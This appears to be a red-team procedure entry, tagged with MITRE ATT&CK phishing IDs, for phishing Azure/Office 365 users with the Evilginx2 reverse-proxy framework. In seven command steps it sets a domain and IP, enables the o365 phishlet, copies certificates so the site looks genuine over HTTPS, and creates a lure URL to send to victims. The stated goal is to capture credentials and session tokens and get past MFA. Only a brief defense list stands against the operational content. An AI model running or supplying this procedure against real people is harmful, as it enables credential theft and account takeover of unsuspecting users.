---
id: 56a08750-4e44-4cb1-a933-6cf32ecfa858
name: Azure-Phishing-with-Evilginx2
type: procedure
verified: true
submitted: true
created_at: '2023-04-06T03:56:15.096096+00:00'
updated_at: '2023-05-24T03:35:02.230319+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - '[[techniques/Phishing|T1566 - Phishing]]'
sub_techniques: []
platforms:
  - Cloud
tags:
  - '[[tags/Cloud - Azure]]'
  - '[[tags/o365]]'
  - '[[tags/Office 365]]'
  - '[[tags/Phishing]]'
  - '[[tags/Phishing with Evilginx2]]'
commands:
  - '[[commands/evilginx2-launch-phishlets]]'
  - '[[commands/evilginx2-configure-domain-ip]]'
  - '[[commands/evilginx2-set-phishlet-hostname]]'
  - '[[commands/evilginx2-get-phishlet-hosts]]'
  - '[[commands/evilginx2-enable-phishlet]]'
  - '[[commands/evilginx2-create-lure]]'
  - '[[commands/evilginx2-get-lure-url]]'
  - '[[commands/powershell-copy-certificate]]'
tools:
  - '[[tools/Evilginx2]]'
validated: true
---

# Azure-Phishing-with-Evilginx2

## Summary

Azure Phishing with Evilginx2 is a man-in-the-middle phishing technique that uses the Evilginx2 framework to create a fake Azure login page, capturing user credentials and session tokens while bypassing multi-factor authentication (MFA). This procedure sets up the phishing infrastructure, configures the phishlet for Office 365/Azure services, and generates a lure URL to send to victims, enabling attackers to gain unauthorized access to the victim's Azure environment.

## Description

This procedure leverages Evilginx2, a phishing framework that acts as a reverse proxy to intercept authentication flows. By mimicking the legitimate Azure or Office 365 login portal, it tricks users into entering credentials, which are then forwarded to the real service to maintain a valid session for the attacker. The attack targets Azure Active Directory (Azure AD) integrated services, allowing credential theft even with MFA enabled, as Evilginx2 captures the session cookie post-authentication. It is particularly effective in spear-phishing campaigns against organizations using Azure for identity management. The setup involves launching Evilginx2, configuring network parameters, enabling the O365 phishlet (which covers Azure-integrated logins), handling certificates for HTTPS, and creating disposable lure links. Success grants the attacker persistent access to the victim's Azure resources, such as virtual machines, storage, or further lateral movement opportunities.

## Requirements

1. Evilginx2 framework installed and accessible (see [[tools/Evilginx2]] for installation).
2. A controlled domain (e.g., username.corp) with DNS control to point subdomains to the attacker's IP.
3. Attacker's IP address (e.g., 10.10.10.10) reachable by victims, often via a VPS or ngrok for external access.
4. PowerShell environment on Windows for certificate handling.
5. Victim must interact with the phishing link and enter Azure credentials.

## Defense

- Educate users on phishing recognition, including suspicious URLs and unexpected login prompts.
- Implement MFA with phishing-resistant methods like FIDO2 hardware keys or certificate-based auth.
- Monitor Azure AD sign-in logs for anomalous IP locations, impossible travel, or unusual user agents.
- Use conditional access policies in Azure AD to restrict logins from untrusted locations.
- Deploy email security gateways to block or flag phishing lures.

## Objectives

1. Capture Azure credentials and session tokens from victims via a realistic phishing site.
2. Bypass MFA to establish a valid, persistent session for the attacker.
3. Gain initial access to the victim's Azure AD account for further exploitation, such as resource enumeration or privilege escalation.

## Instructions

### Step 1: Launch Evilginx2 with Phishlets Directory

**Context**: Start the Evilginx2 interactive shell, pointing to the phishlets directory containing templates for services like O365/Azure. This initializes the framework for configuration.

**Command** ([[commands/evilginx2-launch-phishlets]]):
```powershell
evilginx2 -p C:\Tools\evilginx2\phishlets
```

> This command launches Evilginx2 in interactive mode. Expected output includes the Evilginx2 prompt (e.g., ": ") indicating the shell is ready. Verify by checking for the prompt; if it fails, ensure the path to phishlets is correct and Evilginx2 is installed.

### Step 2: Configure Domain and IP

**Context**: Set the attacker's domain and external IP to route phishing traffic correctly. The domain should be a controlled attacker domain mimicking the target (e.g., login.azure.com).

**Command** ([[commands/evilginx2-configure-domain-ip]]):
```bash
: config domain username.corp
: config ip 10.10.10.10
```

> Enter these commands in the Evilginx2 shell. Expected output confirms the configuration (e.g., "Domain set to username.corp", "IP set to 10.10.10.10"). This step ensures DNS resolution points victims to the attacker's server.

### Step 3: Set Phishlet Hostname

**Context**: Assign a hostname for the O365 phishlet, which handles Azure-integrated logins, to create the phishing subdomain.

**Command** ([[commands/evilginx2-set-phishlet-hostname]]):
```bash
: phishlets hostname o365 login.username.corp
```

> Run in the Evilginx2 shell. Expected output: Confirmation like "Hostname for phishlet 'o365' set to 'login.username.corp'". This prepares the proxy for the fake login page.

### Step 4: Get Phishlet Hosts

**Context**: Retrieve the required DNS hostnames for the phishlet to set up DNS records pointing to the attacker's IP.

**Command** ([[commands/evilginx2-get-phishlet-hosts]]):
```bash
: phishlets get-hosts o365
```

> Execute in the shell. Expected output: List of hosts (e.g., "login.login.username.corp", "www.login.username.corp"). Use this to create A records in your DNS provider pointing to your IP.

### Step 5: Copy Certificates for HTTPS

**Context**: Copy the generated CA certificate and private key to the phishlet directory to enable HTTPS, making the phishing site appear legitimate.

**Command** ([[commands/powershell-copy-certificate]]):
```powershell
Copy-Item C:\Users\Username\.evilginx\crt\ca.crt C:\Users\Username\.evilginx\crt\login.username.corp\o365.crt
Copy-Item C:\Users\Username\.evilginx\crt\private.key C:\Users\Username\.evilginx\crt\login.username.corp\o365.key
```

> Run in PowerShell. Expected output: No errors; files copied successfully (verify with `ls` or `dir`). This ensures encrypted traffic to avoid browser warnings.

### Step 6: Enable the Phishlet

**Context**: Activate the O365 phishlet to start proxying traffic to the real Azure login.

**Command** ([[commands/evilginx2-enable-phishlet]]):
```bash
: phishlets enable o365
```

> In the Evilginx2 shell. Expected output: "Phishlet 'o365' enabled". The phishing site is now live.

### Step 7: Create and Retrieve Lure URL

**Context**: Generate a unique phishing lure (one-time link) for the victim and get its URL to distribute via email or other means.

**Command** ([[commands/evilginx2-create-lure]]):
```bash
: lures create o365
```

> Followed by **Command** ([[commands/evilginx2-get-lure-url]]):
```bash
: lures get-url 0
```

> Expected output for create: Lure ID (e.g., "Lure created with ID 0"). For get-url: Full URL (e.g., "https://login.username.corp/lure/abc123"). Send this URL to the victim; upon login, credentials and tokens will be captured in the Evilginx2 session logs.
